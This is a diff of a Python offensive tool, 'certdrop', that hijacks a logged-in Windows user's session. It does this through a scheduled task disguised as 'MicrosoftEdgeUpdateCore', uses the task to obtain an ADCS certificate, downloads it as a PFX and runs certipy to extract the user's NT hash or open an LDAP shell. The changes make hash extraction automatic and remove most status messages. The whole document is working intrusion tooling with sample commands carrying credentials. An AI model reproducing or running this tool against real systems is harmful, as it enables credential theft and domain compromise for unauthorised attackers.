@@ -3,13 +3,13 @@
 certdrop - ADCS cert theft via scheduled task session hijack
 
 Drops a scheduled task that runs in a target user's active session context
-to request an ADCS certificate, export it as PFX, then optionally runs
-certipy to extract the user's NT hash or open an LDAP shell.
+to request an ADCS certificate, export it as PFX, then runs certipy to
+extract the user's NT hash.
 
 Usage:
-  certdrop.py TARGET -u USER -p PASS -d DOMAIN --dc-ip DC_IP
-  certdrop.py TARGET -u USER -H :NTHASH -d DOMAIN --dc-ip DC_IP
-  certdrop.py TARGET -u USER -k -d DOMAIN --dc-ip DC_IP
+  certdrop.py admin:Pass@TARGET -ca HOST\\CA --dc-ip DC_IP
+  certdrop.py admin@TARGET -H :NTHASH -ca HOST\\CA --dc-ip DC_IP
+  certdrop.py domain/admin:Pass@TARGET -ca HOST\\CA --dc-ip DC_IP -k
 """
 
 import argparse
@@ -31,6 +31,7 @@ from datetime import datetime, timedelta, timezone
 from os import urandom
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
+warnings.filterwarnings("ignore", message=".*ARC4.*")
 
 import requests
 from urllib3 import disable_warnings as _dw
@@ -837,11 +838,10 @@ def smb_read_text(smb, drop_dir, filename):
 
 def smb_file_exists(smb, drop_dir, filename):
     share, rel = _parse_unc(drop_dir)
-    remote = f"{rel}/{filename}" if rel else filename
+    search = f"{rel}/{filename}" if rel else filename
     try:
-        buf = io.BytesIO()
-        smb.getFile(share, remote, buf.write)
-        return True
+        results = smb.listPath(share, search)
+        return len(results) > 0
     except Exception:
         return False
 
@@ -1080,22 +1080,22 @@ def poll_for_result(transport, smb, drop_dir, prefix, timeout=90):
 
     while time.time() < deadline:
         if smb_file_exists(smb, drop_dir, pfx_file):
-            print()
+            print(flush=True)
             return "OK"
-        status = smb_read_text(smb, drop_dir, status_file)
-        if status and status.startswith("FAIL_"):
-            print()
-            return status
+        if smb_file_exists(smb, drop_dir, status_file):
+            status = smb_read_text(smb, drop_dir, status_file)
+            if status and status.startswith("FAIL_"):
+                print(flush=True)
+                return status
         print(".", end="", flush=True)
-        time.sleep(3)
-    print()
+        time.sleep(2)
+    print(flush=True)
     return "TIMEOUT"
 
 
 def cleanup_remote(transport, smb, task_name, drop_dir, prefix):
     _run(transport, f'schtasks /delete /tn "{task_name}" /f')
     smb_delete_files(smb, drop_dir, prefix)
-    info("Cleaned up task and dropped files")
 
 
 # ── Certipy auth ─────────────────────────────────────────────────────────────
@@ -1104,8 +1104,7 @@ def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
                      ldap_shell=False, out_dir="."):
     certipy = shutil.which("certipy-ad") or shutil.which("certipy")
     if not certipy:
-        warn("certipy-ad not found on PATH — run manually:")
-        _print_certipy_cmd(pfx_path, dc_ip, domain, username, ldap_shell)
+        warn("certipy-ad not found — install it or run manually")
         return False
 
     pfx_basename = os.path.basename(pfx_path)
@@ -1120,24 +1119,9 @@ def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
         cmd.append("-ldap-shell")
 
     print()
-    info(f"Running: {' '.join(cmd)}")
-    print()
     result = subprocess.run(cmd, cwd=out_dir,
                             input=b"y\n", timeout=60)
     return result.returncode == 0
-
-
-def _print_certipy_cmd(pfx_path, dc_ip, domain, username, ldap_shell):
-    parts = ["certipy-ad", "auth", "-pfx", pfx_path]
-    if dc_ip:
-        parts.extend(["-dc-ip", dc_ip])
-    if domain:
-        parts.extend(["-domain", domain])
-    if username:
-        parts.extend(["-username", username])
-    if ldap_shell:
-        parts.append("-ldap-shell")
-    print(f"  {' '.join(parts)}")
 
 
 # ── Main ─────────────────────────────────────────────────────────────────────
@@ -1184,24 +1168,21 @@ def main():
             die(f"WinRM connection failed: {e}")
     info("Connected")
 
-    # ── Resolve AD domain FQDN from target machine
+    # Resolve AD domain FQDN from target
     ad_domain = None
     out, _, _ = _run_ps(transport,
         '(Get-WmiObject Win32_ComputerSystem).Domain')
     ad_domain = out.strip() if out.strip() and "." in out.strip() else None
 
-    # ── SMB connection (always needed for file upload/download)
-    info("Establishing SMB connection...")
+    # SMB connection
     try:
         smb = smb_connect(ip, hostname, args.username, args.password,
                           args.nt_hash, args.domain, args.dc_ip,
                           args.aes_key, args.kerberos)
     except Exception as e:
         die(f"SMB connection failed: {e}")
-    info("SMB connected")
 
-    # ── Enumerate sessions
-    info("Enumerating sessions...")
+    # Enumerate sessions and pick target
     sessions = enum_sessions(transport)
     if not sessions:
         die("No active user sessions found.")
@@ -1218,72 +1199,53 @@ def main():
     target_user = target_session["username"]
     user_domain = target_session.get("domain") or args.domain
     target_display = f"{user_domain}\\{target_user}" if user_domain else target_user
-    info(f"Targeting: {target_display} "
+    info(f"Target session: {target_display} "
          f"(session {target_session['id']}, {target_session['state']})")
 
-    # ── CA config
-    ca_config = args.ca
-    if ca_config:
-        info(f"CA: {ca_config}")
-
-    # ── Generate payload files
-    info(f"Generating payload (template: {args.template})...")
+    # Generate and upload payload
     files = generate_files(
-        target_user, user_domain, ca_config, args.template,
+        target_user, user_domain, args.ca, args.template,
         args.prefix, args.drop_dir, args.exec_wrapper)
-    for f in files:
-        info(f"  {f}")
-
-    # ── Clean any leftovers from previous runs, then upload
     smb_delete_files(smb, args.drop_dir, args.prefix)
-    info(f"Uploading to {args.drop_dir}\\ via SMB...")
     try:
         smb_upload(smb, files, args.drop_dir)
     except Exception as e:
         die(f"SMB upload failed: {e}")
-    info("Upload complete")
+    info("Payload uploaded")
 
-    # ── Register and trigger task
-    info("Creating scheduled task...")
+    # Create and trigger scheduled task
     create_and_run_task(transport, args.task_name, args.drop_dir, args.prefix)
 
-    # ── Poll for PFX
+    # Poll for PFX
     info(f"Waiting for PFX (timeout: {args.timeout}s)...")
     result = poll_for_result(
         transport, smb, args.drop_dir, args.prefix, args.timeout)
 
     if result != "OK":
         if result == "TIMEOUT":
-            warn("Timed out waiting for PFX")
-            # Final check — task may have just finished
+            warn("Timed out — checking once more...")
             time.sleep(5)
             if smb_file_exists(smb, args.drop_dir, f"{args.prefix}.pfx"):
-                info("PFX appeared after timeout — continuing")
                 result = "OK"
         if result != "OK":
             msg = STATUS_MESSAGES.get(result, result)
             if result != "TIMEOUT":
                 warn(f"Task failed: {msg}")
-            log_path = os.path.join(args.out_dir, f"{args.prefix}.log")
             try:
                 os.makedirs(args.out_dir, exist_ok=True)
-                smb_download(smb, args.drop_dir, f"{args.prefix}.log", log_path)
-                warn(f"Diagnostics log saved to {log_path}")
+                smb_download(smb, args.drop_dir, f"{args.prefix}.log",
+                             os.path.join(args.out_dir, f"{args.prefix}.log"))
             except Exception:
                 pass
             if not args.no_cleanup:
                 cleanup_remote(transport, smb, args.task_name,
                                args.drop_dir, args.prefix)
-            die("No PFX produced — check CA reachability, template permissions, "
-                "and target user session state.")
+            die("No PFX produced — check CA reachability and template permissions.")
 
-    # ── Download PFX
-    info("Downloading PFX...")
+    # Download PFX
     os.makedirs(args.out_dir, exist_ok=True)
     out_path = os.path.join(args.out_dir, f"{args.prefix}.pfx")
-
     if args.download_method == "smbclient":
-        info("Using smbclient.py for download...")
         smbclient_download(
             ip, args.username, args.password, args.nt_hash, args.domain,
             args.drop_dir, f"{args.prefix}.pfx", out_path,
@@ -1296,34 +1258,19 @@ def main():
         except Exception as e:
             die(f"PFX download failed: {e}")
 
-    # ── Cleanup
+    # Cleanup
     if not args.no_cleanup:
-        info("Cleaning up...")
         cleanup_remote(transport, smb, args.task_name,
                        args.drop_dir, args.prefix)
 
-    # ── Close transport
     if hasattr(transport, 'close'):
         transport.close()
 
-    # ── Certipy auth
+    # Certipy auth
     certipy_domain = ad_domain or args.domain
-    if args.auth or args.ldap_shell:
-        dc = args.dc_ip or ip
-        run_certipy_auth(out_path, dc, certipy_domain, target_user,
-                         args.ldap_shell, args.out_dir)
-    else:
-        print()
-        print("  " + "─" * 58)
-        print("  PFX ready — authenticate with certipy:")
-        print("  " + "─" * 58)
-        _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
-                           certipy_domain, target_user, False)
-        print()
-        print("  For LDAP shell:")
-        _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
-                           certipy_domain, target_user, True)
-        print()
+    dc = args.dc_ip or ip
+    run_certipy_auth(out_path, dc, certipy_domain, target_user,
+                     args.ldap_shell, args.out_dir)
 
 
 # ── Argument parsing ─────────────────────────────────────────────────────────
@@ -1334,10 +1281,10 @@ def parse_args():
         description="ADCS cert theft via scheduled task session hijack",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""examples:
-  %(prog)s administrator:'Pass123'@10.0.0.5 -tu jsmith --dc-ip 10.0.0.1 --auth
-  %(prog)s corp.local/admin:'Pass'@server01 --dc-ip 10.0.0.1 --auth
-  %(prog)s administrator@10.0.0.5 -H :abc123def --dc-ip 10.0.0.1 --ldap-shell
-  %(prog)s corp.local/admin:'Pass'@server01 --dc-ip 10.0.0.1 -k
+  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
+  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1 -tu jsmith
+  %(prog)s corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
+  %(prog)s administrator@10.0.0.5 -H :abc123def -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
 """,
     )
     p.add_argument("target", metavar="[[domain/]username[:password]@]target",
@@ -1357,8 +1304,8 @@ def parse_args():
         help="WinRM port (default: 5985)")
 
     cert = p.add_argument_group("certificate")
-    cert.add_argument("-ca", default=None, metavar="HOST\\NAME",
-        help="CA config string (auto-discover if omitted)")
+    cert.add_argument("-ca", required=True, metavar="HOST\\NAME",
+        help="CA config string (e.g. 'CA01.corp.local\\Corp-CA')")
     cert.add_argument("-template", default="User",
         help="Certificate template (default: User)")
 
@@ -1378,10 +1325,8 @@ def parse_args():
         help="PFX download method (default: smb)")
 
     post = p.add_argument_group("post-exploitation")
-    post.add_argument("--auth", action="store_true",
-        help="Auto-run certipy auth to extract NT hash")
     post.add_argument("--ldap-shell", action="store_true",
-        help="Open LDAP shell via certipy (implies --auth)")
+        help="Open LDAP shell via certipy instead of extracting NT hash")
 
     task = p.add_argument_group("task options")
     task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore",
